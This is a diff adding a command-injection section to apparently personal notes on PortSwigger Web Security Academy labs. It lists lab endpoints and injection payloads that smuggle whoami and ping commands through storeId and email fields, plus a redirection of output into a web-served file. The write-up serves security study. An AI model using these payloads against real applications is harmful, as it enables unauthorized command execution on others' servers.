@@ -932,9 +932,68 @@
 
 ---
 
-<!--
-## **Command Injection**
+## **[Command Injection][command_injection]**
 
+1. #### **OS command injection, simple case**
+
+    ```plaintext
+    https://<lab_url>/product           GET     (productId=1)
+    https://<lab_url>/product           POST    (productId=1&storeId=1)
+
+    v1: productId=1&storeId=1;whoami
+    v2: productId=1&storeId=1|whoami
+    v3: productId=1&storeId=1%26whoami
+    v4: productId=1&storeId=1%26%26whoami
+
+    peter-AO3dKt
+    ```
+
+2. #### **Blind OS command injection with time delays**
+
+    ```plaintext
+    https://<lab_url>/feedback          GET
+    https://<lab_url>/feedback/submit   POST    (csrf=...&name=Psycho&email=test@test.com&subject=Test&message=This+is+a+test.)
+
+    v1: ...&email=test@test.com;ping+-c+10+127.1;...
+    v2: ...&email=test@test.com||ping+-c+10+127.1||...
+    v3: ...&email=test@test.com%26ping+-c+10+127.1%26...
+    v4: ...&email=test@test.com||ping+-c+10+127.1%26%26...
+    ```
+
+3. #### **Blind OS command injection with output redirection**
+
+    ```plaintext
+    https://<lab_url>/feedback          GET
+    https://<lab_url>/feedback/submit   POST    (csrf=&name=Psycho&email=test%40test.com&subject=Test&message=This+is+a+test.)
+
+    v1: ...&email=test@test.com;whoami+>+/var/www/images/whoami.txt;...
+    v2: ...&email=test@test.com|whoami+>+/var/www/images/whoami.txt|...
+    v3: ...&email=test@test.com||whoami+>+/var/www/images/whoami.txt||...
+    v4: ...&email=test@test.com%26whoami+>+/var/www/images/whoami.txt%26...
+
+    https://<lab_url>/product           GET   (productId=1)
+    https://<lab_url>/image             GET   (filename=10.jpg)
+
+    filename=whoami.txt
+    ```
+
+4. #### **Blind OS command injection with out-of-band interaction**
+
+    ```plaintext
+    PENDING UNTIL I GET THE BURP SUITE PRO VERSION
+    ```
+
+5. #### **Blind OS command injection with out-of-band data exfiltration**
+
+    ```plaintext
+    PENDING UNTIL I GET THE BURP SUITE PRO VERSION
+    ```
+
+[command_injection]: https://portswigger.net/web-security/os-command-injection
+
+---
+
+<!--
 ## **Business Logic Vulnerabilities**
 
 ## **Information Disclosure**
